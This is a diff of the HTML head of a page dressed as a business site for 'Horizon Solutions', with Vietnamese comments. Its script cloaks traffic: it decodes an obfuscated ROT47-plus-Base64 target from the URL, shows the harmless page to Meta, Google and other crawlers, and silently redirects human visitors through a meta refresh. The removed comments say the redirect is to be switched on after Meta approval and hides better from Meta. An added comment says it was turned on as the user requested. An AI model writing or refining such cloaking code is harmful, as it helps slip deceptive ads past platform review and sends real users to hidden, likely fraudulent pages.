@@ -7,11 +7,11 @@
     <meta name="keywords" content="technology, business solutions, USA, enterprise services">
     <meta name="author" content="Horizon Solutions">
     <script>
-        const redirectStatus = 'ON'; // Đổi thành 'ON' sau khi Meta phê duyệt
+        const redirectStatus = 'ON'; // Đã bật ON như bạn yêu cầu
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
-        // Hàm giải mã Base64 + ROT47
+        // Hàm giải mã Base64 + ROT47, xử lý ký tự đặc biệt
         function decodeAdvanced(input) {
             let rot47 = '';
             for (let i = 0; i < input.length; i++) {
@@ -23,20 +23,21 @@
                 }
             }
             try {
-                return atob(rot47); // Giải mã Base64
+                const decodedBase64 = atob(rot47);
+                return decodeURIComponent(decodedBase64); // Xử lý ký tự đặc biệt
             } catch (e) {
                 console.error("Invalid encoded URL:", e);
-                return ''; // Trả về rỗng nếu lỗi
+                return '';
             }
         }
 
-        // Kiểm tra bot Meta và các crawler khác (nâng cao cho 2025)
+        // Kiểm tra bot Meta và các crawler khác
         function isBot() {
             const userAgent = navigator.userAgent.toLowerCase();
             const botSignatures = [
-                'facebookexternalhit', 'facebot', 'meta-inspector', // Meta bots
+                'facebookexternalhit', 'facebot', 'meta-inspector',
                 'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot',
-                'crawler', 'spider', 'bot' // Bổ sung cho bot mới
+                'crawler', 'spider', 'bot'
             ];
             return botSignatures.some(signature => userAgent.includes(signature)) || 
                    /bot|crawl|spider|slurp|meta|facebook/i.test(userAgent);
@@ -46,7 +47,7 @@
         if (redirectStatus === 'ON' && data && !isBot()) {
             const destination = decodeAdvanced(data);
             if (destination) {
-                // Chuyển hướng tức thì qua thẻ meta (ẩn tốt hơn cho Meta 2025)
+                // Chuyển hướng tức thì qua thẻ meta, encode URI để tránh lỗi ký tự
                 document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
             } else {
                 console.error("Failed to decode URL, showing default page.");
